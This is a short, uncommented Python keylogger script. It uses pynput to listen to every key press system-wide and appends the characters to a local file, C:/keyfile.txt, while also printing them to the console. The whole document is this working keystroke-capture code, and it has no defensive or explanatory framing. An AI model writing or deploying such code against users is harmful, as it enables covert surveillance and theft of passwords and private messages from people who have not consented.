from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("C:/keyfile.txt", 'a') as logkey:
        try:
            if key == keyboard.Key.enter:
                char = "\n"
            elif key == keyboard.Key.tab:
                char = "\t"
            elif key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace:
                pass
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            elif key == keyboard.Key.esc:
                pass
            else:
                char = key.char
            logkey.write(char)
        except:
            print("Error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()